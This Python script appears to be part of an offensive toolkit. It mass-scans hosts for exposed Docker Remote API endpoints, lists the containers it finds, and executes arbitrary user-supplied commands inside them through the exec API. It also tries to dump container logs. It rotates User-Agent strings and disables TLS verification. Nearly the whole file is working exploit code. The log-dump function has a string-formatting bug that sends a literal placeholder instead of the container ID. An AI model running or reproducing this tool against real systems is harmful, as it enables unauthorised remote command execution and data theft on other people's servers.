#!/usr/bin/env python
# coding=utf-8
   ################
  #   AabyssZG   #
################
import itertools
from inc import output, console
import requests, sys, random, json, hashlib, time
from requests.exceptions import RequestException
from tqdm import tqdm
from termcolor import cprint
from time import sleep
import requests.packages.urllib3

requests.packages.urllib3.disable_warnings()
outtime = 10

ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36,Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20130406 Firefox/23.0",
    "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00"]


def JSON_handle(header1, header2):
    dict1 = json.loads(str(header1).replace("'", "\""))
    dict2 = json.loads(str(header2).replace("'", "\""))
    # 合并两个字典
    merged_dict = {**dict1, **dict2}
    # 将合并后的字典转换为 JSON 字符串
    result_json = json.dumps(merged_dict, indent=2)
    return result_json

def create_exec(urllist, container_id, command, proxies):
    try:
        url = urllist + f"containers/{container_id}/exec"
        payload = {
            "Cmd": command.split(),
            "AttachStdout": True,
            "AttachStderr": True
        }
        response = requests.post(url, json=payload, proxies=proxies)
        if response.status_code == 201:
            exec_id = response.json()['Id']
            cprint("\n[+] 成功创建执行ID: " + exec_id, "red")
            return exec_id
        else:
            cprint("\n[-] 创建执行ID失败，状态码:" + str(response.status_code), "magenta")
            return None
    except RequestException as e:
        print(f"连接出现异常: {e}")
        return None

def start_exec(urllist, exec_id, proxies):
    try:
        url = urllist + f"exec/{exec_id}/start"
        payload = {
            "Detach": False,
            "Tty": False
        }
        response = requests.post(url, json=payload, stream=True, proxies=proxies)
        if response.status_code == 200:
            cprint("\n[+] 命令执行结果（请等待）:", "red")
            for line in response.iter_lines():
                if line:
                    print(line.decode('utf-8'))
        else:
            cprint("\n[-] 执行命令失败，状态码: " + str(response.status_code), "magenta")
    except RequestException as e:
        print(f"连接出现异常: {e}")

def url(urllist, proxies, header_new):
    cprint(f"======开始尝试读取敏感端点的Docker容器内容======", "cyan")
    header = {"User-Agent": random.choice(ua)}
    newheader = json.loads(str(JSON_handle(header, header_new)).replace("'", "\""))
    urlnew = urllist + "containers/json"
    try:
        response = requests.get(url=urlnew, headers=newheader, timeout = outtime, allow_redirects=False, verify=False, proxies=proxies)
        if (response.status_code == 200) and ("Id" in response.text):
            containers = response.json()
            if containers:
                cprint("\n[+] 成功读取到相关容器信息:", "red")
                for container in containers:
                    print(f"ID: {container['Id']}, Image: {container['Image']}, Status: {container['Status']}")
                Rcheck = input("\n[.] 是否要执行命令（Y/N）: ")
                if (Rcheck != "Y" and Rcheck != "y"):
                    sys.exit()
                container_id = input("[.] 请输入容器 ID 来执行命令: ")
                if (container_id == ""):
                    cprint("[-] 您的输入为空，请输入指定容器ID", "yellow")
                    sys.exit()
                command = input("[.] 请输入要执行的命令: ")
                if (command == ""):
                    cprint("[-] 您的输入为空，请输入命令", "yellow")
                    sys.exit()
                exec_id = create_exec(urllist, container_id, command, proxies)
                if exec_id:
                    start_exec(urllist, exec_id, proxies)
            else:
                cprint("[-] 没有容器信息被读取到", "magenta")
        else:
            print(f"连接失败，状态码: {response.status_code}")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except RequestException as e:
        print(f"连接出现异常: {e}")
    except Exception as e:
        cprint("[-] URL为 " + urllist + " 的目标积极拒绝请求，予以跳过！", "magenta")
    sys.exit()

def file(filename, proxies, header_new):
    f1 = open("output.txt", "wb+")
    f1.close()
    cprint("======开始尝试读取目标TXT内是否存在Docker敏感端点======", "cyan")
    sleeps = input("\n是否要延时扫描 (默认0.2秒): ")
    if sleeps == "":
        sleeps = "0.2"
    with open(filename, 'r') as temp:
        for url in temp.readlines():
            url = url.strip()
            if ('://' not in url):
                url = str("http://") + str(url)
            if str(url[-1]) != "/":
                u = url + "/containers/json"
            else:
                u = url + "containers/json"
            header = {"User-Agent": random.choice(ua)}
            newheader = json.loads(str(JSON_handle(header, header_new)).replace("'", "\""))
            try:
                requests.packages.urllib3.disable_warnings()
                r = requests.get(url=u, headers=newheader, timeout = outtime, allow_redirects=False, verify=False, proxies=proxies)
                sleep(int(float(sleeps)))
                if ((r.status_code == 200) and ('Id' in r.text) and ('Image' in r.text)):
                    cprint("[+] 发现Docker端点泄露，URL: " + u + ' ' + "页面长度为:" + str(len(r.content)), "red")
                    f2 = open("output.txt", "a")
                    f2.write(url + '\n')
                    f2.close()
                elif(r.status_code == 200):
                    cprint("[+] 状态码%d" % r.status_code + ' ' + "但无法获取信息 URL为:" + u, "magenta")
                else:
                    cprint("[-] 状态码%d" % r.status_code + ' ' + "无法访问URL为:" + u, "yellow")
            except KeyboardInterrupt:
                print("Ctrl + C 手动终止了进程")
                sys.exit()
            except Exception as e:
                cprint("[-] URL " + url + " 连接错误，已记入日志error.log", "magenta")
                f2 = open("error.log", "a")
                f2.write(str(e) + '\n')
                f2.close()
    count = len(open("output.txt", 'r').readlines())
    if count >= 1:
        print('\n')
        cprint("[+][+][+] 发现目标TXT内存在Docker敏感端点泄露，已经导出至 output.txt ，共%d行记录" % count, "red")
    sys.exit()

def dump(urllist, proxies, header_new):
    cprint(f"======开始尝试读取敏感端点的Docker容器内容======", "cyan")
    header = {"User-Agent": random.choice(ua)}
    newheader = json.loads(str(JSON_handle(header, header_new)).replace("'", "\""))
    urlnew = urllist + "containers/{container_id}/logs?stdout=true&stderr=true"
    container_id = input("\n请输入容器 ID 来提取日志: ")
    if (container_id == ""):
        cprint("[-] 您的输入为空，请输入指定容器ID", "yellow")
        sys.exit()
    try:
        response = requests.get(url=urlnew, headers=newheader, allow_redirects=False, verify=False, proxies=proxies)
        if (response.status_code == 200) and (response.text != ""):
            cprint("[+] 成功读取到容器日志并写入 out.log", "red")
            f1 = open("out.log", "wb+")
            f1.close()
            out = response.text
            f2 = open("out.log", "a")
            f2.write(out + '\n')
            f2.close()
        elif (response.text == ""):
            cprint("[-] 很抱歉，容器日志为空", "magenta")
        else:
            print(f"连接失败，状态码: {response.status_code}")
    except KeyboardInterrupt:
        print("Ctrl + C 手动终止了进程")
        sys.exit()
    except RequestException as e:
        print(f"连接出现异常: {e}")
    sys.exit()
